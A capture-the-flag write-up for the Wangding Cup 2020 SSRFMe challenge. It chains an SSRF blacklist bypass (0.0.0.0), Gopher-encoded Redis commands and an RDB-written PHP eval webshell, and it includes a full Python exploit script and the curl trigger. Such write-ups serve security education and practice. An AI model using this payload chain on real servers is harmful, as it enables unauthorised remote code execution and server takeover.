# Wangding Cup 2020 Xuanwu — SSRFMe (Gopher to Redis Webshell)

> **Flag**: `flag{...}` (organiser-rotated)
>
> A textbook SSRF challenge that compounds two well-known weaknesses: (1) the internal-IP blacklist forgets that `0.0.0.0` is equivalent to `127.0.0.1` on Linux but doesn't fall in `127.0.0.0/8`, and (2) once you can hit `localhost`, an authenticated Redis instance with `requirepass root` becomes a webshell-writing primitive via Gopher. The interesting parts to record are the *exact* Gopher payload encoding (double URL-encoded), why the RDB-written PHP needs leading/trailing newlines to parse, and why the obvious `hint.php` exfiltration is a dead end despite looking promising.

## 0. App overview

| Field | Value |
|---|---|
| Stack | PHP + libcurl (with `gopher://` protocol enabled) |
| Vulnerability | SSRF in `?url=` parameter, blacklist on `127/10/172.16/192.168` |
| Backend | Redis 5.0.3 on `localhost:6379`, `requirepass root` |
| Web root | `/var/www/html/` |

The challenge gives you a URL fetcher and a leaky `hint.php`. The constraint is:

```php
function check_inner_ip($url) {
    $ip = gethostbyname(parse_url($url, PHP_URL_HOST));
    $blocked = ['/^127\./', '/^10\./', '/^172\.16\./', '/^192\.168\./'];
    foreach ($blocked as $re) {
        if (preg_match($re, $ip)) return false;
    }
    return true;   // passes filter → fetched
}
```

The blacklist is incomplete. Three categories slip through:

- `0.0.0.0` (resolves to the local host on Linux, not in `127.0.0.0/8`)
- IPv6 `::1` (no regex catches it)
- DNS rebinding (resolve to public IP at filter time, to internal at fetch time)

We'll use `0.0.0.0`.

## 1. Reconnaissance — leaking the Redis credentials

```
?url=http://0.0.0.0/hint.php
```

`hint.php`:

```php
<?php
$redis_password = "root";
echo "I need Redis password.";
file_put_contents("foo.php", "<?php exit(); ?>" . $_GET['x']);   // not directly useful
```

We learn:

- Redis is on `0.0.0.0:6379` with password `root`
- `hint.php` has a `file_put_contents` but `exit()` prefix renders any written PHP unreachable — the obvious "write a shell here" path is a trap

So the actual exploitation goes through Redis, not through `hint.php`'s writer.

## 2. Why Gopher + Redis

`libcurl` supports `gopher://`, which lets us send arbitrary raw bytes to a TCP port. Redis speaks RESP, a text-based protocol. Combining them gives an SSRF-driven Redis client.

Redis with disk-write capability is RCE-equivalent:

```
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE                           # writes RDB to dir/dbfilename
```

The RDB file contains binary header + the value of whatever key we set. If the value is `<?php eval($_POST['cmd']); ?>` surrounded by enough whitespace, PHP's parser tolerates the surrounding binary and the inline `<?php ... ?>` block executes.

## 3. Building the Gopher payload

RESP encoding for each command (`*N\r\n$len\r\nFIELD\r\n...`):

```
AUTH root
*2\r\n$4\r\nAUTH\r\n$4\r\nroot\r\n

FLUSHALL
*1\r\n$8\r\nFLUSHALL\r\n

SET x "\n\n<?php eval($_POST['cmd']);?>\n\n"
*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$35\r\n\n\n<?php eval($_POST['cmd']);?>\n\n\r\n

CONFIG SET dir /var/www/html/
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$14\r\n/var/www/html/\r\n

CONFIG SET dbfilename shell.php
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n

SAVE
*1\r\n$4\r\nSAVE\r\n
```

Concatenate them in order, prefix with `_` (Gopher's request marker), and **double URL-encode**.

Why double encoding:

1. The web server / PHP receives `?url=gopher://0.0.0.0:6379/_<payload>` and decodes the URL once when parsing query string. After this single decode, the URL passed to `libcurl` should still contain percent-encoded bytes.
2. `libcurl`'s Gopher implementation does its own decode pass on the URL path before opening the TCP socket. After this second decode, raw bytes (including `\r\n`) reach Redis.

Single encoding makes `libcurl` send literal `%0d%0a` to Redis, which Redis happily rejects as "unknown command %0d%0a". Two passes are mandatory.

## 4. Writing the payload via Python

```python
import urllib.parse

def gopher_payload():
    cmds = [
        "AUTH root",
        "FLUSHALL",
        'SET x "\n\n<?php eval($_POST[\'cmd\']);?>\n\n"',
        "CONFIG SET dir /var/www/html/",
        "CONFIG SET dbfilename shell.php",
        "SAVE",
    ]
    # Build RESP framing
    resp = ""
    for cmd in cmds:
        parts = []
        # naive arg splitter — careful with quoted strings
        if cmd.startswith("SET x"):
            parts = ["SET", "x", '\n\n<?php eval($_POST[\'cmd\']);?>\n\n']
        else:
            parts = cmd.split()
        resp += f"*{len(parts)}\r\n"
        for p in parts:
            resp += f"${len(p)}\r\n{p}\r\n"
    return resp

raw = gopher_payload()
once = urllib.parse.quote(raw, safe='')        # first encode
twice = urllib.parse.quote(once, safe='')      # second encode
print(f"http://target/?url=gopher://0.0.0.0:6379/_{twice}")
```

Send the resulting URL via `?url=`. After Redis processes `SAVE`, `/var/www/html/shell.php` contains an RDB header + our PHP one-liner + RDB trailer. PHP parses it, ignores the binary garbage, executes the `<?php eval(...) ?>` block.

## 5. Triggering the webshell

```
$ curl -d 'cmd=system("cat /flag");' http://target/shell.php
flag{...}
```

## 6. Why the `\n\n` padding on the PHP value

The RDB file format prepends a magic number (`REDIS0009` or similar) and key/value metadata, all of which is binary. PHP's parser scans for `<?php` tags but is sensitive to malformed UTF-8 just before the tag in some configurations. Wrapping the payload with newlines ensures:

- The `<?php` opens on a clean line, not embedded in binary noise
- The closing `?>` (or absent — short echo style works too) is followed by harmless whitespace before more RDB binary

Without the newlines, PHP sometimes 500s on parse, sometimes succeeds silently with no output — undebuggable.

## 7. Full exploit

```python
#!/usr/bin/env python3
import sys
import urllib.parse
import requests

TARGET = sys.argv[1].rstrip('/')

def gopher_for_redis(commands_with_args):
    """commands_with_args is a list of lists, e.g. [['AUTH', 'root'], ...]"""
    out = ""
    for parts in commands_with_args:
        out += f"*{len(parts)}\r\n"
        for p in parts:
            out += f"${len(p)}\r\n{p}\r\n"
    return out

shell_value = '\n\n<?php eval($_POST["cmd"]); ?>\n\n'
cmds = [
    ["AUTH", "root"],
    ["FLUSHALL"],
    ["SET", "x", shell_value],
    ["CONFIG", "SET", "dir", "/var/www/html/"],
    ["CONFIG", "SET", "dbfilename", "shell.php"],
    ["SAVE"],
]

raw   = gopher_for_redis(cmds)
once  = urllib.parse.quote(raw, safe='')
twice = urllib.parse.quote(once, safe='')

ssrf_url = f"gopher://0.0.0.0:6379/_{twice}"
r = requests.get(f"{TARGET}/?url={ssrf_url}")
print(f"[+] Wrote shell (HTTP {r.status_code})")

# Verify
r = requests.post(f"{TARGET}/shell.php", data={"cmd": "system('cat /flag');"})
print(r.text)
```

## 8. Traps and lessons learned

| Trap | Why it cost me time | Resolution |
|---|---|---|
| Single URL encoding | Sent `%0d%0a` literally to Redis through `libcurl`; Redis logged unknown commands and the SAVE never wrote anything | Must double-encode for SSRF + Gopher chains. PHP decodes once for query string, libcurl decodes once for Gopher path |
| Tried `hint.php`'s `file_put_contents` first | It looked like the obvious sink ("here's a writer, write a shell") | The `<?php exit(); ?>` prefix kills any payload before it executes. It's a red herring; pivot to Redis |
| Used `127.0.0.1` initially | The filter immediately blocks it | `0.0.0.0` is the trivial bypass on Linux. Also try `localhost`, `[::1]`, `0`, `127.1`, hexadecimal IP encoding |
| Wrote shell.php without newline padding | PHP parser 500'd on the RDB binary; no error in response, just blank | Wrap value as `\n\n<?php ... ?>\n\n` so the PHP tag opens cleanly |
| Webshell triggered nothing on first try | Used `eval($_POST['cmd'])` but sent the cmd in GET | Match the method: `eval($_POST[...])` requires POST. Check the webshell snippet's superglobal carefully |
| Redis password unknown | Initially didn't read hint.php at all; tried unauthenticated Redis | Always recon the whole app before exploitation. The password was sitting in plain text in `hint.php` |

## 9. Methodology takeaways

1. **SSRF blacklists are almost always incomplete.** `0.0.0.0`, IPv6 `::1`, DNS rebinding, IP encoding variants (octal, hex, decimal), and short forms (`127.1`) all bypass naive regex filters. Always enumerate.
2. **Gopher + authenticated Redis = RCE.** This is *the* standard SSRF escalation in PHP environments with `libcurl`. The skill is in payload assembly, not in the conceptual leap.
3. **RESP framing is mechanical.** `*N\r\n$len\r\nFIELD\r\n...` per command. Build a helper once, reuse forever.
4. **Double URL encoding is the SSRF chain's signature.** Whenever your SSRF target is itself a protocol parser (Gopher, dict, ftp), expect two layers of decoding between you and the target.
5. **Red herrings are a CTF tactic.** `hint.php`'s file_put_contents looks tantalising but is intentionally crippled. Notice the unconditional `exit()` and move on quickly.

## 10. Related techniques

- [Wangding Cup 2020 PicDown](wangdingbei2020_picdown.md) *(coming soon)* — same competition, different bug: `/proc/self/fd` recovery + hidden route RCE
- Gopher payload generator: [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) — automates RESP framing for Redis / MySQL / SMTP / FastCGI
- [PortSwigger's SSRF cheatsheet](https://portswigger.net/web-security/ssrf) — comprehensive IP-bypass reference
